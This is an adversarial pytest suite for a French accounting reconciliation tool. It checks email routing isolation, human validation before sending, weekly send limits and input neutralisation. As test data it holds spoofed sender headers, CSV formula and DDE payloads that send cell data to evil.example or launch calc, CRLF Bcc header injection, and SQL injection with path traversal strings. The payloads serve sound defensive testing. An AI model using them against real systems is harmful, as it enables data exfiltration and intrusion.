"""Revue adversariale independante du MVP.

Chaque defaut affirme est un test marque `xfail(strict=True)` : il devient rouge
le jour ou le defaut est corrige (retirer alors le marqueur). Les tests sans
marqueur sont des attaques qui ont ECHOUE : comportements sains verifies.

Ce fichier ne depend d'aucun autre fichier de tests (helpers recopies) : la
suite `tests/test_cycle.py` evolue en parallele.
"""

from __future__ import annotations

import csv
import datetime as dt
import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import threading
import time
import unicodedata
from decimal import Decimal
from email import policy
from email.message import EmailMessage
from email.parser import BytesParser
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

RACINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RACINE / "src"))

from rapprochement import cycle, envoi, routage  # noqa: E402
from rapprochement.depot import Depot  # noqa: E402
from rapprochement.modeles import (  # noqa: E402
    EtatPiece,
    FichierEntrant,
    MessageEntrant,
    MotifNonRoute,
    OperationBancaire,
    Piece,
    PieceAttendue,
    Sens,
    Statut,
    StatutBrouillon,
    StatutRoutage,
)
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.parseurs import lire_dossiers  # noqa: E402

PARIS = ZoneInfo("Europe/Paris")
J0 = dt.date(2026, 10, 5)  # lundi
VALIDEUSE = "Marie Durand"
CARACTERES_FORMULE = ("=", "+", "-", "@", "\t", "\r")


def a(jour: dt.date, h: int = 10, m: int = 0) -> dt.datetime:
    return dt.datetime.combine(jour, dt.time(h, m), tzinfo=PARIS)


DOSSIERS = [
    ["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
    ["BETA", "Beta SAS", "contact@beta-sas.fr", "Mme Beta", "20", "courtois", "C-DIRECT", ""],
]
OPERATIONS = [
    # dossier, date, libelle, debit, credit, reference, devise
    ["ALPHA", "2026-09-03", "CB LOXAM LOCATION", "120.00", "", "A-001", "EUR"],
    ["ALPHA", "2026-09-17", "PRLV ORANGE PRO", "59.90", "", "A-002", "EUR"],
    ["BETA", "2026-09-10", "CB METRO CASH", "230.40", "", "B-001", "EUR"],
]


def ecrire_entree(rep: Path, *, operations=OPERATIONS, dossiers=DOSSIERS, pieces=()) -> Path:
    rep.mkdir(parents=True, exist_ok=True)
    with open(rep / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact",
                    "jour_echeance_tva", "ton_relance", "circuit", "email_relais"])
        w.writerows(dossiers)
    with open(rep / "releve_bancaire.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "date_operation", "libelle", "debit", "credit", "reference", "devise"])
        w.writerows(operations)
    with open(rep / "pieces_recues.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["id_piece", "dossier", "fichier", "fournisseur", "date_facture", "montant_ttc", "devise"])
        w.writerows(pieces)
    return rep


def nouvelle_instance(rep: Path, validateurs: str | None = f"{VALIDEUSE}\nPaul Martin\n") -> cycle.Instance:
    inst = cycle.Instance(rep)
    inst.preparer()
    if validateurs is not None:
        inst.validateurs.write_text(validateurs, encoding="utf-8")
    return inst


def eml(expediteur: str, message_id: str, *, objet: str = "Justificatif", corps: str = "",
        fichiers: tuple[tuple[str, bytes], ...] = ()) -> bytes:
    msg = EmailMessage()
    msg["From"] = expediteur
    msg["To"] = "pieces@cabinet.invalid"
    msg["Subject"] = objet
    msg["Message-ID"] = message_id
    msg["Date"] = "Wed, 07 Oct 2026 09:00:00 +0200"
    msg.set_content(corps or "Bonjour")
    for nom, contenu in fichiers:
        msg.add_attachment(contenu, maintype="application", subtype="pdf", filename=nom)
    return bytes(msg)


def lancer(entree: Path, inst: cycle.Instance, jour: dt.date) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, jour, a(jour))


@pytest.fixture
def entree(tmp_path: Path) -> Path:
    return ecrire_entree(tmp_path / "entree")


@pytest.fixture
def inst(tmp_path: Path) -> cycle.Instance:
    return nouvelle_instance(tmp_path / "instance")


def brouillon_de(inst: cycle.Instance, destinataire: str, statut=StatutBrouillon.BROUILLON):
    trouves = [b for b in cycle.brouillons(inst, statut) if b.destinataire == destinataire]
    assert len(trouves) == 1, trouves
    return trouves[0]


def cellules(chemin: Path) -> list[str]:
    with open(chemin, newline="", encoding="utf-8") as f:
        return [c for ligne in list(csv.reader(f))[1:] for c in ligne]


# ===========================================================================
# 1. CA-03 : fuite entre clients par le routage
# ===========================================================================

ADRESSES = {"A": frozenset({"jean@client-a.fr"}), "B": frozenset({"paul@client-b.fr"})}
ATTENDUE_A = PieceAttendue(
    reference="A-1", dossier="A", periode="2026-09", montant=Decimal("89.90"),
    date_operation=dt.date(2026, 9, 10), libelle="CB FOURNISSEUR",
)
ATTENDUE_B = PieceAttendue(
    reference="B-1", dossier="B", periode="2026-09", montant=Decimal("89.90"),
    date_operation=dt.date(2026, 9, 10), libelle="CB FOURNISSEUR",
)

FROM_USURPES = [
    b'"jean@client-a.fr" <pirate@evil.com>',          # nom d'affichage qui imite l'adresse
    b"jean@client-a.fr <pirate@evil.com>",            # idem, sans guillemets
    b"pirate@evil.com (jean@client-a.fr)",            # commentaire
    b"<@client-a.fr:pirate@evil.com>",                # route source obsolete
    b"<@evil.com:jean@client-a.fr>",
    b"jean@client-a.fr@evil.com",
    b'"jean@client-a.fr"@evil.com',
    b"=?utf-8?q?jean=40client-a.fr?= <pirate@evil.com>",
    b"=?utf-8?q?jean=40client-a.fr?=",
    b"jean@client-a.fr\x00@evil.com",
    b"jean@client-a.fr.",                              # point final
    b"jean@xn--client-a-x.fr",                         # punycode
    "jean@client-а.fr".encode(),                  # homoglyphe cyrillique
    b"jean@evil.client-a.fr.evil.com",
    b"jean@mail.client-a.fr",                          # sous-domaine
    b"jean@client-a.fr, pirate@evil.com",
    b"<jean@client-a.fr> pirate@evil.com",
    b"pirate@evil.com <jean@client-a.fr>",            # deux angle-addr concurrents
    b"jean@client-a.fr\r\n\tpirate@evil.com",
]


@pytest.mark.parametrize("entete", FROM_USURPES)
def test_sain_from_trompeur_jamais_route_vers_a(tmp_path: Path, entete: bytes) -> None:
    """Attaque ratee : aucune forme tordue de From n'est lue comme jean@client-a.fr."""
    brut = (b"From: " + entete + b"\r\nTo: x@cabinet.fr\r\nSubject: facture 89,90 EUR\r\n"
            b"Message-ID: <m@x>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
            b"--b\r\nContent-Type: text/plain\r\n\r\nci-joint\r\n"
            b"--b\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=f.pdf\r\n\r\nPDF\r\n--b--\r\n")
    (tmp_path / "m.eml").write_bytes(brut)
    msg = routage.lire_eml(tmp_path / "m.eml")
    assert msg.expediteur != "jean@client-a.fr"
    decisions = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
    assert all(d.dossier != "A" for d in decisions)
    assert all(d.statut is not StatutRoutage.PROPOSEE for d in decisions)


def test_sain_sender_et_reply_to_ignores(tmp_path: Path) -> None:
    """Sender / Reply-To a l'adresse de A, From inconnu : pas de routage vers A."""
    brut = eml("pirate@evil.com", "<s@x>", objet="facture 89,90 EUR", fichiers=(("f.pdf", b"PDF"),))
    brut = brut.replace(b"To:", b"Sender: jean@client-a.fr\r\nReply-To: jean@client-a.fr\r\nTo:", 1)
    (tmp_path / "m.eml").write_bytes(brut)
    msg = routage.lire_eml(tmp_path / "m.eml")
    d = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A], aujourdhui=J0)
    assert [x.dossier for x in d] == [None]


def test_sain_casse_et_alias_restent_dans_le_bon_dossier() -> None:
    """Majuscules et +alias du VRAI domaine de A : routes vers A, jamais vers B."""
    for exp in ("JEAN@CLIENT-A.FR", "jean+factures@client-a.fr"):
        m = MessageEntrant("<x@y>", exp.lower(), dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                           "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
        d = routage.router(m, adresses=ADRESSES, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
        assert [(x.dossier, x.reference_operation) for x in d] == [("A", "A-1")]


@pytest.mark.parametrize("domaine", ["hotmail.ca", "yahoo.ca", "live.co.uk", "t-online.de",
                                     "libero.it", "videotron.ca"])
def test_regression_domaine_grand_public_hors_liste_sert_de_preuve(domaine: str) -> None:
    adresses = {"A": frozenset({f"gerant.a@{domaine}"}), "B": frozenset({"paul@client-b.fr"})}
    # Un inconnu (ou le gerant de B depuis sa boite perso) ecrit depuis le meme fournisseur.
    m = MessageEntrant("<x@y>", f"inconnu@{domaine}", dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                       "facture 89,90 EUR", "", (FichierEntrant("facture.pdf", b"PDF de B"),))
    d = routage.router(m, adresses=adresses, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
    assert all(x.statut is not StatutRoutage.PROPOSEE for x in d), d


def test_regression_domaine_grand_public_hors_liste_boucle_complete(tmp_path: Path) -> None:
    dossiers = [["ALPHA", "Alpha SARL", "gerant.alpha@hotmail.ca", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
                DOSSIERS[1]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers,
                           operations=[OPERATIONS[0], OPERATIONS[2]])
    inst = nouvelle_instance(tmp_path / "i")
    (inst.entrant / "1.eml").write_bytes(eml(
        "Inconnu <quelquun@hotmail.ca>", "<p1@x>", objet="facture 120,00 EUR",
        fichiers=(("facture_2026-09.pdf", b"%PDF confidentiel"),)))
    resume = lancer(entree, inst, J0)
    file = cycle.lister_file(inst)
    assert resume.propositions == 0
    assert all(d.statut is not StatutRoutage.PROPOSEE for d in file)


def test_sain_boucle_complete_nom_affiche_usurpe(entree: Path, inst: cycle.Instance) -> None:
    """CLI + cycle : From '"compta@alpha-sarl.fr" <pirate@evil.com>' finit en DOSSIER_INCONNU."""
    (inst.entrant / "1.eml").write_bytes(eml(
        '"compta@alpha-sarl.fr" <pirate@evil.com>', "<p1@x>", objet="facture 120,00 EUR",
        fichiers=(("facture_2026-09.pdf", b"%PDF"),)))
    lancer(entree, inst, J0)
    file = cycle.lister_file(inst)
    assert [(d.statut, d.dossier) for d in file] == [(StatutRoutage.NON_ROUTEE, None)]


def test_regression_code_dossier_nfc_nfd_jamais_relance(tmp_path: Path) -> None:
    nfc, nfd = "CAFÉ", "CAFÉ"
    dossiers = [[nfc, "Cafe SARL", "compta@cafe.fr", "M. Cafe", "15", "courtois", "C-DIRECT", ""]]
    ops = [[nfd, "2026-09-03", "CB LOXAM", "120.00", "", "C-001", "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    resume = lancer(entree, inst, J0)
    assert resume.brouillons_crees == 1, resume.texte()


def test_sain_rattacher_ne_traverse_pas_les_dossiers(entree: Path, inst: cycle.Instance) -> None:
    """rattacher --dossier BETA --reference A-001 : refuse (la reference est d'ALPHA)."""
    lancer(entree, inst, J0)
    with pytest.raises(cycle.ErreurCycle):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(J0), dossier="BETA",
                              reference="A-001", id_piece="x")


def charger_cli():
    import importlib.util
    spec = importlib.util.spec_from_file_location("cli_cycle_adv", RACINE / "scripts" / "cycle.py")
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def test_regression_cli_file_sequences_d_echappement(entree, inst, capsys) -> None:
    brut = eml("inconnu@evil.example", "<x@y>", fichiers=(("f.pdf", b"%PDF"),))
    brut = brut.replace(b"Message-ID: <x@y>", b"Message-ID: \x1b[1A\x1b[2K\x1b[1A\x1b[2Kcache")
    (inst.entrant / "1.eml").write_bytes(brut)
    lancer(entree, inst, J0)
    capsys.readouterr()
    assert charger_cli().main(["file", "--instance", str(inst.racine), "--date", J0.isoformat()]) == 0
    sortie = capsys.readouterr().out
    assert "cache" in sortie
    assert "\x1b" not in sortie
    assert "\\x1b[1A" in sortie            # rendu visible, pas supprime


def test_sain_cli_par_truque_et_envoi_sans_validation(entree, inst, capsys) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    for par in ("../Marie Durand", "systeme", "Marie Durand\nx", "# commentaire"):
        assert cli.main(["valider", b.id_relance, "--par", par, *base]) == 1
    assert cli.main(["envoyer", b.id_relance, *base]) == 1
    assert list(inst.outbox.glob("*.eml")) == []
    assert cli.main(["valider", b.id_relance, "--par", "MARIE durand", *base]) == 0
    assert cli.main(["envoyer", b.id_relance, *base, "--heure", "07:59"]) == 1   # hors creneau
    assert cli.main(["envoyer", b.id_relance, *base]) == 0
    assert cli.main(["envoyer", b.id_relance, *base]) == 1
    assert len(list(inst.outbox.glob("*.eml"))) == 1


# ===========================================================================
# 2. CA-06 : envoi sans validation humaine
# ===========================================================================


def _forcer(inst: cycle.Instance, id_relance: str, statut: str, valide_par: str) -> None:
    conn = sqlite3.connect(inst.depot)
    with conn:
        conn.execute("UPDATE brouillons SET statut=?, valide_par=? WHERE id_relance=?",
                     (statut, valide_par, id_relance))
    conn.close()


@pytest.mark.parametrize("valide_par", ["", "   ", "systeme", "ROBOT", "cron"])
def test_sain_statut_forge_en_sql_sans_humain_refuse(entree, inst, valide_par) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    _forcer(inst, b.id_relance, "validee", valide_par)
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    _forcer(inst, b.id_relance, "en_cours", valide_par or "x")
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    assert list(inst.outbox.glob("*.eml")) == []


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7, 'Identite non authentifiee' : "
    "un acces en ecriture a l'instance permet de tout falsifier). UPDATE brouillons SET "
    "statut='validee', valide_par='Mallory' en SQL : `envoyer` emet sans verification "
    "croisee avec validateurs.txt ni avec une entree `valide` du journal."))
def test_defaut_validation_forgee_en_sql_par_un_inconnu_part(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    _forcer(inst, b.id_relance, "validee", "Mallory")
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    assert list(inst.outbox.glob("*.eml")) == []


def test_sain_envoyee_immuable_en_sql(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    conn = sqlite3.connect(inst.depot)
    with pytest.raises(sqlite3.DatabaseError):
        with conn:
            conn.execute("UPDATE brouillons SET statut='validee' WHERE id_relance=?", (b.id_relance,))
    with pytest.raises(sqlite3.DatabaseError):
        with conn:
            conn.execute("DELETE FROM envois")
    conn.close()
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0 + dt.timedelta(days=8)))
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def test_sain_expediteur_dossier_appele_directement_refuse(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    for forge in (b, b.__class__(**{**b.__dict__, "statut": StatutBrouillon.VALIDEE, "valide_par": "Marie"}),
                  b.__class__(**{**b.__dict__, "statut": StatutBrouillon.EN_COURS, "valide_par": "bot"})):
        with pytest.raises(envoi.ErreurEnvoiCertaine):
            envoi.ExpediteurDossier(inst.outbox).envoyer(forge)
    assert list(inst.outbox.glob("*.eml")) == []


@pytest.mark.parametrize("par", [
    "../Marie Durand", "Marie Durand/..", "Marie Durand", "Marie  Durand", "Marie Durand\nsysteme",
    "# commentaire", "", " ", "x" * 100_000, "Marie Durand\x00", "Mаrie Durand",  # a cyrillique
    "MARIE DURAND​",
])
def test_sain_par_truque_refuse(entree, tmp_path, par) -> None:
    inst = nouvelle_instance(tmp_path / "i", "# commentaire\n\nMarie Durand\r\nPaul Martin\r\n")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, b.id_relance, par, maintenant=a(J0))
    assert cycle.brouillons(inst, StatutBrouillon.VALIDEE) == []


def test_sain_validateurs_crlf_et_casse(entree, tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", "# commentaire\r\n\r\nMarie Durand\r\nPaul Martin\r\n")
    assert cycle.exiger_validateur(inst, "  paul MARTIN ") == "Paul Martin"


def test_regression_validateurs_avec_bom(tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\nPaul Martin\r\n".encode("utf-8"))
    assert cycle.exiger_validateur(inst, "Marie Durand") == "Marie Durand"
    assert cycle.lire_validateurs(inst) == ("Marie Durand", "Paul Martin")
    # Le BOM n'ouvre pas de porte : un nom non declare reste refuse.
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_validateur(inst, "\ufeffMallory")


def test_sain_validateurs_illisible_refuse_toujours(tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.mkdir()
    with pytest.raises(Exception):
        cycle.exiger_validateur(inst, VALIDEUSE)
    inst.validateurs.rmdir()
    inst.validateurs.write_bytes("H\xe9l\xe8ne\n".encode("latin-1"))
    with pytest.raises(Exception):
        cycle.exiger_validateur(inst, "Hélène")


def test_sain_instance_alternative_n_herite_pas_des_validateurs(entree, inst, tmp_path) -> None:
    """--instance pointant vers une autre racine : ses validateurs (absents) gouvernent."""
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    autre = tmp_path / "autre"
    shutil.copytree(inst.racine, autre)
    (autre / "validateurs.txt").unlink()
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(cycle.Instance(autre), b.id_relance, VALIDEUSE, maintenant=a(J0))


# ===========================================================================
# 3. CA-05 : double envoi / limite hebdomadaire
# ===========================================================================


class _Coupure:
    def envoyer(self, brouillon):
        raise TimeoutError("connexion SMTP coupee apres DATA")


def test_regression_envoi_incertain_ignore_par_la_limite_hebdo(tmp_path: Path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b1.id_relance, VALIDEUSE, maintenant=a(J0))
    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b1.id_relance, maintenant=a(J0), expediteur=_Coupure())
    assert cycle.brouillons(inst, StatutBrouillon.EN_COURS)[0].id_relance == b1.id_relance
    # Le client a bien recu b1 : il envoie ses pieces, rattachees par un humain.
    j1 = J0 + dt.timedelta(days=1)
    for ref in ("A-001", "A-002"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(j1), dossier="ALPHA", reference=ref,
                              id_piece=f"P-{ref}")
    # Une nouvelle operation apparait le lendemain.
    ecrire_entree(tmp_path / "e", operations=OPERATIONS + [
        ["ALPHA", "2026-10-02", "CB AMAZON", "33.00", "", "A-005", "EUR"]])
    lancer(entree, inst, j1)
    b2 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b2.id_relance, VALIDEUSE, maintenant=a(j1))
    # La bonne raison, pas une autre (piece non reclamable, limite hebdo...).
    with pytest.raises(envoi.EnvoiIncertainEnAttente):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a(j1))
    assert list(inst.outbox.glob("*.eml")) == []
    # Un humain constate que b1 est parti : la limite hebdomadaire prend le relais.
    cycle.trancher_envoi(inst, b1.id_relance, VALIDEUSE, parti=True, maintenant=a(j1))
    with pytest.raises(envoi.EnvoiNonValide, match="7 jours"):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a(j1))
    assert list(inst.outbox.glob("*.eml")) == []


def test_sain_deux_processus_meme_brouillon_un_seul_eml(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    depart = threading.Barrier(4)
    resultats: list[str] = []

    def tenter() -> None:
        depart.wait()
        try:
            cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
            resultats.append("ok")
        except Exception as exc:  # noqa: BLE001
            resultats.append(type(exc).__name__)

    fils = [threading.Thread(target=tenter) for _ in range(4)]
    for f in fils:
        f.start()
    for f in fils:
        f.join()
    assert resultats.count("ok") == 1, resultats
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def _deux_brouillons_meme_destinataire(inst: cycle.Instance, entree: Path):
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    return b1


@pytest.mark.parametrize("envoi_1, tentative, autorise", [
    # Passage a l'heure d'hiver le dimanche 25/10/2026 : 7 jours calendaires, pas 7x24 h.
    (a(dt.date(2026, 10, 23), 17, 59), a(dt.date(2026, 10, 29), 8, 0), False),
    (a(dt.date(2026, 10, 23), 17, 59), a(dt.date(2026, 10, 30), 8, 0), True),
    # Instant exprime en UTC : c'est la date de Paris qui compte.
    (dt.datetime(2026, 10, 23, 15, 59, tzinfo=dt.timezone.utc),
     dt.datetime(2026, 10, 30, 7, 0, tzinfo=dt.timezone.utc), True),
    # Fin d'annee : 31/12 puis 06/01 (6 jours, 1er janvier ferie au milieu).
    (a(dt.date(2026, 12, 31), 9), a(dt.date(2027, 1, 6), 9), False),
    (a(dt.date(2026, 12, 31), 9), a(dt.date(2027, 1, 7), 9), True),
])
def test_sain_fenetre_hebdo_fuseaux_dst_fin_d_annee(tmp_path, envoi_1, tentative, autorise) -> None:
    """La limite d'un e-mail par 7 jours tient aux changements d'heure et d'annee."""
    from rapprochement.audit import JournalAudit
    from rapprochement.modeles import Brouillon
    depot = Depot(tmp_path / "d.sqlite")
    journal = JournalAudit(tmp_path / "a.jsonl")
    for i in (1, 2):
        depot.sauver_brouillon(Brouillon(f"b{i}", "x@client.fr", "objet", "corps", ("D",), (f"R{i}",),
                                         1, envoi_1.date()))
        envoi.valider(depot, journal, f"b{i}", VALIDEUSE, maintenant=envoi_1)
    envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b1", maintenant=envoi_1)
    if autorise:
        envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b2", maintenant=tentative)
    else:
        with pytest.raises(envoi.EnvoiLimiteHebdomadaire):
            envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b2", maintenant=tentative)
    depot.fermer()


def test_sain_rejeu_cycle_apres_rejet_ne_recree_rien_le_meme_jour(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.rejeter_relance(inst, b.id_relance, VALIDEUSE, "trop tot", maintenant=a(J0))
    r = lancer(entree, inst, J0)
    assert r.brouillons_crees == 0
    assert cycle.brouillons(inst, StatutBrouillon.BROUILLON) == [
        x for x in cycle.brouillons(inst, StatutBrouillon.BROUILLON) if x.destinataire != b.destinataire]


# ===========================================================================
# 4. Injections
# ===========================================================================

FORMULE_LIBELLE = '=HYPERLINK("https://evil.example/?d="&A2,"Voir")'
FORMULE_FICHIER = '=IMPORTXML(CONCAT("https:",CHAR(47),CHAR(47),"evil.example?",B2),"a").pdf'


def _sorties_piegees(tmp_path: Path) -> cycle.Instance:
    ops = [
        ["ALPHA", "2026-09-03", FORMULE_LIBELLE, "120.00", "", "A-001", "EUR"],
        ["ALPHA", "2026-09-05", "+cmd|' /C calc'!A0", "", "15.00", "A-009", "EUR"],   # credit -> a_verifier
        ["BETA", "2026-09-10", "@SUM(1+1)*cmd|' /C calc'!A0", "230.40", "", "B-001", "EUR"],
    ]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    # Piece deja escaladee en base pour peupler escalades.csv.
    with Depot(inst.depot) as d:
        d.sauver_pieces([PieceAttendue(
            reference="B-001", dossier="BETA", periode="2026-09", montant=Decimal("230.40"),
            date_operation=dt.date(2026, 9, 10), libelle="@SUM(1+1)*cmd|' /C calc'!A0",
            etat=EtatPiece.ESCALADEE, nb_relances=3, date_premiere_demande=dt.date(2026, 9, 14),
            date_derniere_relance=dt.date(2026, 9, 28))])
    # Un inconnu, sans aucune authentification, choisit le nom de la piece jointe.
    (inst.entrant / "1.eml").write_bytes(eml("inconnu@evil.example", "<p@x>",
                                             fichiers=((FORMULE_FICHIER, b"%PDF"),)))
    lancer(entree, inst, J0)
    return inst


def test_regression_formule_csv_tableau_suivi(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "tableau_suivi.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_pieces_attendues(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "pieces_attendues.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_a_verifier(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "a_verifier.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_escalades(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert (inst.sortie / "escalades.csv").exists()
    assert not [c for c in cellules(inst.sortie / "escalades.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_file_humaine_nom_de_piece_jointe(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    cel = cellules(inst.sortie / "file_humaine.csv")
    assert not [c for c in cel if c.startswith(CARACTERES_FORMULE)]
    assert "'" + FORMULE_FICHIER in cel             # neutralise, pas efface


def test_regression_formules_neutralisees_sans_perte_dans_tous_les_csv(tmp_path) -> None:
    """Chaque CSV de sortie : aucune cellule declencheuse, et le texte d'origine survit."""
    inst = _sorties_piegees(tmp_path)
    (inst.entrant / "=cmd|' calc'!A0.eml").write_bytes(_imbrique(1000))   # nom en quarantaine
    lancer(inst.racine.parent / "e", inst, J0)
    tous = {f.name: cellules(f) for f in inst.sortie.glob("*.csv")}
    assert {"tableau_suivi.csv", "pieces_attendues.csv", "a_verifier.csv", "file_humaine.csv",
            "escalades.csv", "periodes.csv", "quarantaine.csv"} <= set(tous)
    for nom, cel in tous.items():
        assert not [c for c in cel if c.startswith(CARACTERES_FORMULE)], nom
    assert "'" + FORMULE_LIBELLE in tous["tableau_suivi.csv"]
    assert "'=cmd|' calc'!A0.eml" in tous["quarantaine.csv"]
    assert "120.00" in tous["tableau_suivi.csv"]     # un nombre reste un nombre


def test_sain_injection_d_en_tete_par_le_libelle(tmp_path) -> None:
    """Un libelle avec CRLF + Bcc reste dans le corps : aucun en-tete ajoute a l'e-mail."""
    ops = [["ALPHA", "2026-09-03", "CB LOXAM\r\nBcc: espion@evil.example\r\n\r\nX", "120.00", "", "A-001", "EUR"]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    [fichier] = list(inst.outbox.glob("*.eml"))
    msg = BytesParser(policy=policy.default).parsebytes(fichier.read_bytes())
    assert msg["Bcc"] is None and msg.get_all("To") == ["compta@alpha-sarl.fr"]
    assert "evil" not in "".join(f"{k}:{v}" for k, v in msg.items())


def test_sain_injection_d_en_tete_par_la_raison_sociale(tmp_path) -> None:
    dossiers = [["ALPHA", "Alpha\r\nBcc: espion@evil.example", "compta@alpha-sarl.fr", "M", "15",
                 "courtois", "C-DIRECT", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    try:
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    except envoi.ErreurEnvoi:
        pass
    for f in inst.outbox.glob("*.eml"):
        msg = BytesParser(policy=policy.default).parsebytes(f.read_bytes())
        assert msg["Bcc"] is None


def test_sain_injection_sql_et_traversee_par_codes_et_references(tmp_path) -> None:
    code = "../../../evasion"
    ref = "x'); DROP TABLE pieces; --"
    dossiers = [[code, "Evasion", "compta@evasion.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [[code, "2026-09-03", "CB LOXAM", "120.00", "", ref, "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "x" / "y" / "i")
    avant = set(tmp_path.rglob("*"))
    lancer(entree, inst, J0)
    apres = set(tmp_path.rglob("*")) - avant
    assert all(inst.racine in p.parents for p in apres), apres
    assert [(p.dossier, p.reference) for p in cycle.pieces(inst)] == [(code, ref)]


